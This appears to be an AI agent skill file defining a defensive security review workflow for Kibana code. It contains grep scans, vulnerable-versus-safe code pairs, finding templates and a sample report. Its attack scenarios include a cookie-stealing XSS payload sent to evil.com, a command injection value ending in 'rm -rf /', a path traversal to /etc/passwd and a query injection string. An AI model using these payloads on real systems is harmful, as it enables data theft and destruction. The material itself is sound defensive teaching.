---
name: security-reviewer
description: >
  Automated security review of code changes for common vulnerabilities in Kibana.
  Scans for XSS, SQL injection, CSRF, auth bypass, path traversal, command injection,
  and validates Kibana-specific security patterns (authz, RBAC, input validation).
trigger: |
  - "security review"
  - "check for vulnerabilities"
  - "security audit"
  - "review security"
  - Auto-trigger when new API route added
  - Auto-trigger when handling user input
examples:
  - input: "Security review of the attachment routes"
    output: "Scans for auth bypass (checks requiredPrivileges), input validation (schema.any() usage), XSS risks (dangerouslySetInnerHTML), path traversal (file path validation), generates security checklist with findings"
  - input: "Check for vulnerabilities in the new user management API"
    output: "Reviews authz configuration, validates input schemas, checks RBAC privilege enforcement, identifies missing CSRF protection, reports security gaps"
---

# @security-reviewer

**Purpose:** Automated security review of code changes for common vulnerabilities with Kibana-specific pattern awareness.

**Context:** Security vulnerabilities in production can have serious consequences. This skill provides systematic security review for all code changes, especially API routes, user input handling, and privilege-sensitive operations.

**Philosophy:**
- **Defense in depth:** Check multiple layers (route auth, input validation, business logic)
- **Kibana-aware:** Understand framework-specific security patterns (authz, RBAC, schema validation)
- **Actionable findings:** Provide specific fixes, not just warnings
- **Zero false negatives:** Better to flag for manual review than miss a vulnerability

---

## When to Use

**Automatic activation triggers:**
- User mentions "security review", "check for vulnerabilities", "security audit"
- New API route added (router.get/post/put/delete/patch)
- User input handling code (request.body, request.params, request.query)
- File path operations (fs.readFile, path.join)
- Shell command execution (child_process.exec, spawn)

**Manual invocation:**
```
/security-reviewer
```

---

## Core Workflow

### Phase 1: Scope Identification (30 seconds)

**Goal:** Identify files to review based on security risk.

#### Step 1.1: Find Changed Files

**If user provides specific files/paths:**
```bash
# User specified files to review
FILES="x-pack/plugins/security_solution/server/routes/alerts.ts"
```

**If reviewing uncommitted changes:**
```bash
# Get uncommitted changes
git diff --name-only HEAD
```

**If reviewing a PR or branch:**
```bash
# Get files changed in branch
git diff --name-only origin/main...HEAD
```

**If reviewing a commit range:**
```bash
# User specified commit range
git diff --name-only <start-commit>...<end-commit>
```

#### Step 1.2: Filter High-Risk Files

**Prioritize files with security implications:**

```bash
# High-risk patterns
SECURITY_PATTERNS=(
  "**/server/routes/**/*.ts"           # API routes
  "**/server/lib/**/*.ts"              # Business logic
  "**/server/services/**/*.ts"         # Service layer
  "**/*auth*.ts"                       # Auth-related
  "**/*permission*.ts"                 # Permission checks
  "**/*validation*.ts"                 # Input validation
  "**/public/components/**/*.tsx"      # UI components (XSS risk)
)
```

**Flag for review:**
- All server-side route handlers
- Any file handling user input (body, params, query)
- Any file with privilege/RBAC checks
- Any file performing file I/O or shell execution
- Public UI components that render user content

---

### Phase 2: Vulnerability Scanning (5-10 minutes)

**Goal:** Scan for common vulnerability patterns and Kibana-specific security issues.

---

#### Scan 2.1: XSS (Cross-Site Scripting)

**Pattern:** Unescaped user input rendered in UI

**Search patterns:**
```typescript
// DANGER: Raw HTML injection
dangerouslySetInnerHTML={{ __html: userInput }}

// DANGER: Unescaped React children
<div>{unsafeUserInput}</div>  // If unsafeUserInput contains HTML

// DANGER: Direct DOM manipulation
element.innerHTML = userInput;
document.write(userInput);
```

**Scan command:**
```bash
# Find dangerouslySetInnerHTML usage
grep -rn "dangerouslySetInnerHTML" <changed-files> || echo "No dangerouslySetInnerHTML found"

# Find innerHTML usage
grep -rn "\.innerHTML\s*=" <changed-files> || echo "No innerHTML usage found"

# Find document.write usage
grep -rn "document\.write" <changed-files> || echo "No document.write found"
```

**Safe patterns:**
```typescript
// SAFE: React automatically escapes
<div>{userInput}</div>  // Text content, not HTML

// SAFE: EUI sanitizes HTML
import { EuiMarkdownFormat } from '@elastic/eui';
<EuiMarkdownFormat>{userMarkdown}</EuiMarkdownFormat>

// SAFE: Manual sanitization
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userInput);
<div dangerouslySetInnerHTML={{ __html: clean }} />
```

**Findings template:**
```markdown
### XSS Risk: Unescaped user input in UI

**File:** `path/to/file.tsx:42`
**Pattern:** `dangerouslySetInnerHTML` with unsanitized input
**Severity:** HIGH

**Vulnerable code:**
```typescript
<div dangerouslySetInnerHTML={{ __html: comment.body }} />
```

**Fix:**
```typescript
import DOMPurify from 'dompurify';
const cleanBody = DOMPurify.sanitize(comment.body);
<div dangerouslySetInnerHTML={{ __html: cleanBody }} />

// Or use EUI markdown component:
import { EuiMarkdownFormat } from '@elastic/eui';
<EuiMarkdownFormat>{comment.body}</EuiMarkdownFormat>
```
```

---

#### Scan 2.2: SQL Injection (or ES Query Injection)

**Pattern:** Raw queries without parameterization

**Search patterns:**
```typescript
// DANGER: String concatenation in ES query
const query = `{ "term": { "user": "${username}" } }`;

// DANGER: Template literals in ES queries
const query = {
  query_string: {
    query: `user:${username}`,  // User input in query string
  },
};

// DANGER: Raw string passed to SQL-like API
esClient.sql.query({ query: `SELECT * FROM table WHERE user = '${username}'` });
```

**Scan command:**
```bash
# Find template literals in query objects
grep -rn 'query.*`.*\${' <changed-files> || echo "No template literal queries found"

# Find string concatenation in queries
grep -rn 'query.*+.*request\.' <changed-files> || echo "No string concat in queries"

# Find esClient.sql.query with variables
grep -rn 'esClient\.sql\.query.*\${' <changed-files> || echo "No SQL query injection risk"
```

**Safe patterns:**
```typescript
// SAFE: Structured query objects (ES Query DSL)
const query = {
  term: {
    user: username,  // Value, not query string
  },
};

// SAFE: Parameterized SQL (if using SQL connector)
esClient.sql.query({
  query: 'SELECT * FROM table WHERE user = ?',
  params: [username],
});

// SAFE: Kibana search service (handles escaping)
const searchResponse = await data.search.search({
  params: {
    body: {
      query: {
        match: { user: username },
      },
    },
  },
});
```

**Findings template:**
```markdown
### SQL/Query Injection Risk: Unparameterized query

**File:** `path/to/file.ts:58`
**Pattern:** Template literal in ES query
**Severity:** CRITICAL

**Vulnerable code:**
```typescript
const query = {
  query_string: {
    query: `user:${request.body.username}`,
  },
};
```

**Fix:**
```typescript
// Use structured query (ES Query DSL)
const query = {
  term: {
    user: request.body.username,
  },
};

// Or use match query for text search
const query = {
  match: {
    user: request.body.username,
  },
};
```
```

---

#### Scan 2.3: Auth Bypass & RBAC Issues

**Pattern:** Missing privilege checks on routes

**Search patterns:**
```typescript
// DANGER: No authz configuration
router.post({
  path: '/api/plugin/sensitive',
  // No security.authz block!
});

// DANGER: authz disabled without justification
router.post({
  path: '/api/plugin/sensitive',
  security: {
    authz: {
      enabled: false,  // WHY? Is this public?
    },
  },
});

// DANGER: No RBAC check in handler
async (context, request, response) => {
  // Directly performs privileged operation
  await deleteAllData();  // No privilege check!
};
```

**Scan command:**
```bash
# Find routes without security.authz
grep -rn -A 10 "router\.\(get\|post\|put\|delete\|patch\)" <changed-files> \
  | grep -v "security:" \
  | head -20 || echo "All routes have security config"

# Find authz.enabled: false
grep -rn "enabled:\s*false" <changed-files> || echo "No disabled authz found"

# Find routes with no requiredPrivileges
grep -rn -A 5 "security:\s*{" <changed-files> \
  | grep -v "requiredPrivileges" \
  | head -20 || echo "All security configs have requiredPrivileges"
```

**Safe patterns:**
```typescript
// SAFE: Explicit privilege requirement
router.post({
  path: '/api/plugin/sensitive',
  security: {
    authz: {
      requiredPrivileges: ['plugin', 'write'],
    },
  },
});

// SAFE: Disabled with clear reason (public endpoint)
router.get({
  path: '/api/plugin/public/status',
  security: {
    authz: {
      enabled: false,
      reason: 'Public health check endpoint, no sensitive data',
    },
  },
});

// SAFE: RBAC check in handler (if route-level check insufficient)
async (context, request, response) => {
  const { securitySolution } = await context;
  const hasPrivilege = await securitySolution.checkPrivileges(['delete']);

  if (!hasPrivilege) {
    return response.forbidden({
      body: { message: 'Insufficient privileges' },
    });
  }

  await deleteData();
};
```

**Findings template:**
```markdown
### Auth Bypass Risk: Missing privilege check

**File:** `path/to/routes/alerts.ts:28`
**Pattern:** Route with no `security.authz` configuration
**Severity:** CRITICAL

**Vulnerable code:**
```typescript
router.post({
  path: '/api/detection_engine/alerts/_delete',
  // No security configuration!
});
```

**Fix:**
```typescript
router.post({
  path: '/api/detection_engine/alerts/_delete',
  security: {
    authz: {
      requiredPrivileges: ['securitySolution', 'writeAlerts'],
    },
  },
});
```

**Verification:**
- [ ] User must have both `securitySolution` and `writeAlerts` privileges
- [ ] Route returns 403 Forbidden if user lacks privileges
- [ ] Test with non-privileged user account
```

---

#### Scan 2.4: Input Validation Issues

**Pattern:** Missing or weak input validation schemas

**Search patterns:**
```typescript
// DANGER: schema.any() is too permissive
validate: {
  request: {
    body: schema.any(),  // Accepts anything!
  },
}

// DANGER: No validation at all
router.post({
  path: '/api/plugin/data',
  // No validate block!
});

// DANGER: Nullable without constraints
body: schema.nullable(schema.string()),  // Can be null or any string (no length limit)

// DANGER: Optional without constraints
body: schema.maybe(schema.object({}, { unknowns: 'allow' })),  // Accepts any extra fields
```

**Scan command:**
```bash
# Find schema.any() usage
grep -rn "schema\.any()" <changed-files> || echo "No schema.any() found"

# Find missing validate blocks in routes
grep -rn -A 15 "router\.\(get\|post\|put\|delete\|patch\)" <changed-files> \
  | grep -L "validate:" \
  | head -10 || echo "All routes have validation"

# Find unknowns: 'allow' in schemas
grep -rn "unknowns:\s*['\"]allow['\"]" <changed-files> || echo "No permissive schemas found"
```

**Safe patterns:**
```typescript
// SAFE: Strict schema with constraints
validate: {
  request: {
    body: schema.object({
      name: schema.string({ minLength: 1, maxLength: 255 }),
      email: schema.string({ validate: isValidEmail }),
      age: schema.number({ min: 0, max: 150 }),
    }),
    params: schema.object({
      id: schema.string({ minLength: 1 }),
    }),
    query: schema.object({
      page: schema.maybe(schema.number({ min: 1 })),
      size: schema.maybe(schema.number({ min: 1, max: 100 })),
    }),
  },
}

// SAFE: Zod schema with strict validation (for newer APIs)
import { z } from '@kbn/zod';

const bodySchema = z.object({
  name: z.string().min(1).max(255),
  email: z.string().email(),
  age: z.number().int().min(0).max(150),
});
```

**Findings template:**
```markdown
### Input Validation Risk: Permissive schema

**File:** `path/to/routes/users.ts:45`
**Pattern:** `schema.any()` used for request body
**Severity:** HIGH

**Vulnerable code:**
```typescript
validate: {
  request: {
    body: schema.any(),
  },
}
```

**Fix:**
```typescript
validate: {
  request: {
    body: schema.object({
      name: schema.string({ minLength: 1, maxLength: 255 }),
      email: schema.string(),
      role: schema.oneOf([
        schema.literal('admin'),
        schema.literal('editor'),
        schema.literal('viewer'),
      ]),
    }),
  },
}
```

**Validation checklist:**
- [ ] All required fields defined
- [ ] String length limits enforced
- [ ] Number ranges enforced
- [ ] Enum values constrained (no arbitrary strings)
- [ ] No `schema.any()` or `{ unknowns: 'allow' }`
```

---

#### Scan 2.5: Path Traversal

**Pattern:** Unvalidated file paths from user input

**Search patterns:**
```typescript
// DANGER: User input directly in file path
const filePath = path.join('/data', request.body.filename);
fs.readFile(filePath);

// DANGER: No path validation
const file = `./uploads/${request.params.fileId}`;

// DANGER: Relative paths allowed
const resolvedPath = path.resolve(request.body.path);
```

**Scan command:**
```bash
# Find path.join with request data
grep -rn "path\.join.*request\." <changed-files> || echo "No path.join with request data"

# Find fs operations with request data
grep -rn "fs\.\(readFile\|writeFile\|unlink\|stat\).*request\." <changed-files> || echo "No fs operations with request data"

# Find path.resolve with request data
grep -rn "path\.resolve.*request\." <changed-files> || echo "No path.resolve with request data"
```

**Safe patterns:**
```typescript
// SAFE: Whitelist allowed paths
const ALLOWED_PATHS = ['/data/uploads', '/data/exports'];
const basePath = '/data/uploads';
const requestedPath = path.join(basePath, request.body.filename);

// Validate path is within allowed directory
if (!requestedPath.startsWith(basePath)) {
  throw new Error('Invalid path');
}

// SAFE: Use UUID instead of filename
const fileId = uuidv4();
const filePath = path.join('/data/uploads', `${fileId}.json`);

// SAFE: Validate against whitelist of allowed filenames
const ALLOWED_FILES = ['report.pdf', 'summary.csv'];
if (!ALLOWED_FILES.includes(request.body.filename)) {
  throw new Error('Invalid filename');
}
```

**Findings template:**
```markdown
### Path Traversal Risk: Unvalidated file path

**File:** `path/to/file.ts:72`
**Pattern:** User input in `path.join` without validation
**Severity:** CRITICAL

**Vulnerable code:**
```typescript
const filePath = path.join('/data', request.body.filename);
const data = fs.readFileSync(filePath);
```

**Attack scenario:**
```
POST /api/plugin/file
Body: { "filename": "../../../etc/passwd" }
→ Reads /etc/passwd instead of /data/<file>
```

**Fix:**
```typescript
const basePath = '/data/uploads';
const requestedPath = path.join(basePath, request.body.filename);

// Validate path is within base directory
const normalizedPath = path.normalize(requestedPath);
if (!normalizedPath.startsWith(basePath)) {
  return response.badRequest({
    body: { message: 'Invalid file path' },
  });
}

const data = fs.readFileSync(normalizedPath);
```

**Additional safeguards:**
- [ ] Whitelist allowed file extensions
- [ ] Use UUIDs instead of user-provided filenames
- [ ] Restrict file access to specific directory
- [ ] Log suspicious path traversal attempts
```

---

#### Scan 2.6: Command Injection

**Pattern:** Unsanitized shell commands

**Search patterns:**
```typescript
// DANGER: User input in exec/spawn
child_process.exec(`ls ${request.body.directory}`);

// DANGER: Template literals in shell commands
exec(`git clone ${request.body.repo}`);

// DANGER: Array args with user input (still risky if not validated)
spawn('ffmpeg', ['-i', request.body.input]);
```

**Scan command:**
```bash
# Find exec usage
grep -rn "child_process\.exec\|exec(" <changed-files> || echo "No exec usage found"

# Find spawn usage
grep -rn "child_process\.spawn\|spawn(" <changed-files> || echo "No spawn usage found"

# Find execSync usage
grep -rn "execSync(" <changed-files> || echo "No execSync usage found"
```

**Safe patterns:**
```typescript
// SAFE: No user input in shell commands
child_process.exec('ls /data/uploads');

// SAFE: Whitelist allowed commands
const ALLOWED_COMMANDS = ['backup', 'restore', 'status'];
if (!ALLOWED_COMMANDS.includes(request.body.command)) {
  throw new Error('Invalid command');
}

// BETTER: Use library instead of shell commands
// Instead of: exec(`git clone ${repo}`)
import simpleGit from 'simple-git';
await simpleGit().clone(repo);

// BETTER: Use child_process.spawn with array args (no shell interpolation)
// Instead of: exec(`ffmpeg -i ${input}`)
spawn('ffmpeg', ['-i', sanitizedInput], { shell: false });
```

**Findings template:**
```markdown
### Command Injection Risk: Unsanitized shell command

**File:** `path/to/file.ts:88`
**Pattern:** User input in `child_process.exec`
**Severity:** CRITICAL

**Vulnerable code:**
```typescript
child_process.exec(`convert ${request.body.inputFile} output.png`);
```

**Attack scenario:**
```
POST /api/plugin/convert
Body: { "inputFile": "input.jpg; rm -rf /" }
→ Executes: convert input.jpg; rm -rf / output.png
```

**Fix:**
```typescript
// Option 1: Use spawn with array args (no shell)
import { spawn } from 'child_process';

const sanitizedInput = path.basename(request.body.inputFile);
spawn('convert', [sanitizedInput, 'output.png'], { shell: false });

// Option 2: Use library instead of shell command
import sharp from 'sharp';
await sharp(request.body.inputFile).toFile('output.png');
```

**Validation checklist:**
- [ ] No `exec()` with user input
- [ ] Use `spawn()` with array args, not template strings
- [ ] Whitelist allowed commands
- [ ] Use libraries instead of shell commands where possible
```

---

#### Scan 2.7: CSRF (Cross-Site Request Forgery)

**Pattern:** State-changing endpoints without CSRF protection

**Note:** Kibana's CSRF protection is automatic for versioned routes. Only flag if custom implementation bypasses this.

**Search patterns:**
```typescript
// DANGER: Custom route without CSRF (rare in Kibana)
app.post('/custom-endpoint', handler);  // Not using router.versioned

// DANGER: Disabling CSRF protection
router.post({
  path: '/api/plugin/data',
  options: {
    xsrfRequired: false,  // WHY?
  },
});
```

**Scan command:**
```bash
# Find xsrfRequired: false
grep -rn "xsrfRequired:\s*false" <changed-files> || echo "No CSRF bypass found"

# Find custom Express-style routes (not using router.versioned)
grep -rn "app\.\(post\|put\|delete\|patch\)" <changed-files> || echo "All routes use Kibana router"
```

**Safe patterns:**
```typescript
// SAFE: Use router.versioned (CSRF automatic)
router.versioned
  .post({
    path: '/api/plugin/data',
    // CSRF automatically enforced by Kibana platform
  })
  .addVersion({ version: '1' }, handler);

// SAFE: Explicitly require CSRF (redundant but clear)
router.post({
  path: '/api/plugin/data',
  options: {
    xsrfRequired: true,  // Explicit (though this is the default)
  },
});
```

**Findings template:**
```markdown
### CSRF Risk: CSRF protection disabled

**File:** `path/to/routes/data.ts:102`
**Pattern:** `xsrfRequired: false` on state-changing endpoint
**Severity:** HIGH

**Vulnerable code:**
```typescript
router.post({
  path: '/api/plugin/data',
  options: {
    xsrfRequired: false,
  },
});
```

**Fix:**
```typescript
// Remove xsrfRequired: false (use default CSRF protection)
router.versioned
  .post({
    path: '/api/plugin/data',
    // CSRF automatically enforced
  })
  .addVersion({ version: '1' }, handler);
```

**Only disable CSRF if:**
- [ ] Endpoint is truly idempotent (GET-like semantics)
- [ ] Endpoint requires external authentication (API key, webhook signature)
- [ ] Documented reason in code comments
```

---

### Phase 3: Security Checklist Generation (2 minutes)

**Goal:** Generate comprehensive security checklist for all API routes and user input handlers.

#### Step 3.1: Extract All API Routes

**Find all routes in changed files:**
```bash
# Extract route definitions
grep -rn "router\.\(versioned\.\)\?\(get\|post\|put\|delete\|patch\)" <changed-files>
```

**Parse output:**
```
path/to/routes/alerts.ts:28:  router.post({
path/to/routes/alerts.ts:42:    path: '/api/detection_engine/alerts/_delete',
path/to/routes/users.ts:15:  router.get({
path/to/routes/users.ts:18:    path: '/api/users/{id}',
```

#### Step 3.2: Generate Route Security Table

**Template:**
```markdown
## API Route Security Checklist

| Route | Method | Auth | Validation | RBAC | CSRF | Notes |
|-------|--------|------|------------|------|------|-------|
| `/api/detection_engine/alerts/_delete` | POST | ✅ `requiredPrivileges: ['securitySolution']` | ⚠️ `schema.any()` | ✅ Handler checks `deleteAlerts` privilege | ✅ Auto | **FIX:** Replace `schema.any()` with strict schema |
| `/api/users/{id}` | GET | ✅ `requiredPrivileges: ['user', 'read']` | ✅ Zod schema | ✅ Route-level only | N/A (GET) | All good ✅ |
```

**Legend:**
- ✅ = Implemented correctly
- ⚠️ = Warning / Needs review
- ❌ = Missing / Vulnerable
- N/A = Not applicable

#### Step 3.3: Input Handler Security Table

**For all user input handling:**
```markdown
## User Input Security Checklist

| File | Input Source | Validation | Sanitization | Usage | Status |
|------|--------------|------------|--------------|-------|--------|
| `alerts.ts:58` | `request.body.query` | ❌ None | ❌ None | Used in ES query | **CRITICAL: SQL injection risk** |
| `alerts.ts:72` | `request.params.id` | ✅ `schema.string()` | N/A | Used in ES term query | ✅ Safe |
| `ui/alert_table.tsx:42` | `comment.body` | N/A (display only) | ❌ None | Rendered with `dangerouslySetInnerHTML` | **HIGH: XSS risk** |
```

---

### Phase 4: Generate Security Report (2 minutes)

**Goal:** Produce actionable security report with prioritized findings.

#### Report Structure

````markdown
# Security Review Report

**Date:** [YYYY-MM-DD]
**Reviewed by:** @security-reviewer
**Scope:** [Describe: "PR #12345", "Uncommitted changes", "Commit abc123..def456"]

---

## Executive Summary

**Total findings:** 5
- **Critical:** 2 (must fix before merge)
- **High:** 1 (should fix before merge)
- **Medium:** 2 (fix soon)
- **Low:** 0

**Overall risk assessment:** 🔴 HIGH (critical vulnerabilities found)

---

## Critical Findings (MUST FIX)

### 🚨 CRITICAL-001: SQL Injection in Alert Query Endpoint

**File:** `x-pack/plugins/security_solution/server/routes/alerts.ts:58`
**Severity:** CRITICAL
**CWE:** CWE-89 (SQL Injection)

**Vulnerable code:**
```typescript
const query = {
  query_string: {
    query: `user:${request.body.username}`,
  },
};
```

**Attack scenario:**
```
POST /api/detection_engine/alerts
Body: { "username": "admin) OR 1=1--" }
→ Bypasses user filter, returns all alerts
```

**Fix:**
```typescript
// Use structured query (ES Query DSL)
const query = {
  term: {
    user: request.body.username,
  },
};
```

**Verification steps:**
1. Replace query string with structured query
2. Test with malicious input: `") OR 1=1--"`
3. Verify query fails gracefully (no injection)

---

### 🚨 CRITICAL-002: Command Injection in Report Generator

**File:** `x-pack/plugins/reporting/server/lib/generator.ts:88`
**Severity:** CRITICAL
**CWE:** CWE-78 (OS Command Injection)

**Vulnerable code:**
```typescript
child_process.exec(`convert ${request.body.inputFile} output.png`);
```

**Attack scenario:**
```
POST /api/reporting/generate
Body: { "inputFile": "input.jpg; rm -rf /" }
→ Executes: convert input.jpg; rm -rf / output.png
```

**Fix:**
```typescript
import { spawn } from 'child_process';
const sanitizedInput = path.basename(request.body.inputFile);
spawn('convert', [sanitizedInput, 'output.png'], { shell: false });
```

---

## High Findings (SHOULD FIX)

### ⚠️ HIGH-001: XSS Risk in Comment Rendering

**File:** `x-pack/plugins/security_solution/public/components/alerts/alert_comments.tsx:42`
**Severity:** HIGH
**CWE:** CWE-79 (Cross-Site Scripting)

**Vulnerable code:**
```typescript
<div dangerouslySetInnerHTML={{ __html: comment.body }} />
```

**Attack scenario:**
```
Comment body: "<script>fetch('https://evil.com?cookie=' + document.cookie)</script>"
→ Executes JavaScript, steals session cookie
```

**Fix:**
```typescript
import DOMPurify from 'dompurify';
const cleanBody = DOMPurify.sanitize(comment.body);
<div dangerouslySetInnerHTML={{ __html: cleanBody }} />

// Or use EUI markdown:
import { EuiMarkdownFormat } from '@elastic/eui';
<EuiMarkdownFormat>{comment.body}</EuiMarkdownFormat>
```

---

## Medium Findings (FIX SOON)

### 📝 MEDIUM-001: Permissive Input Validation

**File:** `x-pack/plugins/security_solution/server/routes/users.ts:45`
**Severity:** MEDIUM

**Vulnerable code:**
```typescript
validate: {
  request: {
    body: schema.any(),
  },
}
```

**Fix:**
```typescript
validate: {
  request: {
    body: schema.object({
      name: schema.string({ minLength: 1, maxLength: 255 }),
      email: schema.string(),
      role: schema.oneOf([
        schema.literal('admin'),
        schema.literal('editor'),
        schema.literal('viewer'),
      ]),
    }),
  },
}
```

---

### 📝 MEDIUM-002: Missing RBAC Check in Handler

**File:** `x-pack/plugins/security_solution/server/routes/alerts.ts:102`
**Severity:** MEDIUM

**Issue:** Route has `requiredPrivileges` but handler performs privileged operation without additional check.

**Recommendation:**
```typescript
async (context, request, response) => {
  const { securitySolution } = await context;
  const hasDeletePrivilege = await securitySolution.checkPrivileges(['deleteAlerts']);

  if (!hasDeletePrivilege) {
    return response.forbidden({
      body: { message: 'Insufficient privileges to delete alerts' },
    });
  }

  await deleteAlerts();
};
```

---

## API Route Security Summary

| Route | Method | Auth | Validation | RBAC | Status |
|-------|--------|------|------------|------|--------|
| `/api/detection_engine/alerts` | POST | ✅ | ❌ `schema.any()` | ⚠️ No handler check | **MEDIUM-001** |
| `/api/detection_engine/alerts/_delete` | POST | ✅ | ✅ | ⚠️ No handler check | **MEDIUM-002** |
| `/api/users/{id}` | GET | ✅ | ✅ | ✅ | ✅ All good |

---

## Recommended Actions

**Before merge:**
1. ✅ Fix CRITICAL-001 (SQL injection)
2. ✅ Fix CRITICAL-002 (command injection)
3. ✅ Fix HIGH-001 (XSS risk)

**Soon after merge:**
4. Fix MEDIUM-001 (input validation)
5. Fix MEDIUM-002 (RBAC check)

**Testing checklist:**
- [ ] Unit tests for input validation edge cases
- [ ] Integration tests for authz enforcement
- [ ] Scout E2E tests for privilege escalation attempts
- [ ] Penetration testing (if applicable)

---

## Additional Resources

- [Kibana Security Best Practices](https://www.elastic.co/guide/en/kibana/current/security-best-practices.html)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Kibana RBAC Documentation](https://www.elastic.co/guide/en/kibana/current/kibana-role-management.html)
- Internal: `~/.agents/rules/security-patterns.md` (if exists)

---

**Sign-off:**
- [ ] All critical findings addressed
- [ ] All high findings addressed or accepted risk documented
- [ ] Security checklist reviewed
- [ ] Tests added for security-sensitive code paths
````

---

## Integration with Other Skills

- **api-authz** - Use for detailed authz configuration review
- **kibana-precommit-checks** - Auto-run security review before commit
- **promotion-evidence-tracker** - Log security reviews as evidence (Technical Leadership)

---

## Configuration

**Custom rules:**
Place custom security patterns in `~/.agents/rules/security-patterns.md`:

```markdown
# Custom Security Patterns

## Allow-list for schema.any() usage
- `plugins/fleet/server/routes/package_policy.ts:42` - Reason: Legacy API, fixed in v2

## Allow-list for dangerouslySetInnerHTML
- `plugins/dashboard/public/markdown_widget.tsx:88` - Reason: Uses DOMPurify
```

**Severity thresholds:**
```yaml
# ~/.agents/config/security-reviewer.yml
severity:
  critical: ["SQL injection", "Command injection", "Auth bypass"]
  high: ["XSS", "Path traversal", "CSRF"]
  medium: ["Weak validation", "Missing RBAC check"]
  low: ["Info disclosure", "Verbose errors"]
```

---

## Success Criteria

**A security review is complete when:**
1. ✅ All changed files scanned for vulnerability patterns
2. ✅ All API routes reviewed for authz/validation/RBAC
3. ✅ All user input handlers reviewed for injection risks
4. ✅ Security report generated with prioritized findings
5. ✅ Actionable fixes provided for each finding
6. ✅ No false positives (flagged code is actually vulnerable or needs manual review)

---

## False Positive Handling

**If a finding is a false positive:**

Add to allow-list in `~/.agents/rules/security-patterns.md`:

```markdown
## False Positive: schema.any() in legacy route

**File:** `plugins/legacy/server/routes/old_api.ts:42`
**Pattern:** `schema.any()`
**Reason:** Legacy API, deprecated in v10.0, no new usage
**Accepted by:** [Your Name]
**Date:** 2024-03-20
```

---

## Example: Security Review of Attachments API

**Scenario:** "Security review of the attachment routes"

**Execution:**

1. **Scope (30s)**
   ```bash
   FILES="x-pack/plugins/agent_builder/server/routes/attachments.ts"
   ```

2. **Scanning (5 min)**
   - XSS: ❌ No `dangerouslySetInnerHTML` found
   - SQL Injection: ❌ No raw queries found
   - Auth: ✅ All routes have `requiredPrivileges: [apiPrivileges.readAgentBuilder]`
   - Validation: ⚠️ Found `schema.any()` at line 183 (attachment data)
   - Path Traversal: N/A (no file operations)
   - Command Injection: N/A (no shell commands)

3. **Checklist (2 min)**
   | Route | Auth | Validation | Status |
   |-------|------|------------|--------|
   | `GET /conversations/{id}/attachments` | ✅ | ✅ | ✅ |
   | `POST /conversations/{id}/attachments` | ✅ | ⚠️ `schema.any()` for `data` | **MEDIUM** |

4. **Report (2 min)**
   ```markdown
   # Security Review: Attachment Routes

   **Findings:** 1 medium

   ### MEDIUM-001: Permissive schema for attachment data

   **File:** `attachments.ts:183`
   **Pattern:** `data: schema.any()`

   **Recommendation:**
   - If attachment types are known, use discriminated union
   - If truly dynamic, validate shape at runtime

   **Fix:**
   ```typescript
   data: schema.oneOf([
     schema.object({ /* text attachment */ }),
     schema.object({ /* esql attachment */ }),
     schema.object({ /* viz attachment */ }),
   ]),
   ```
   ```

**Total time:** ~10 minutes
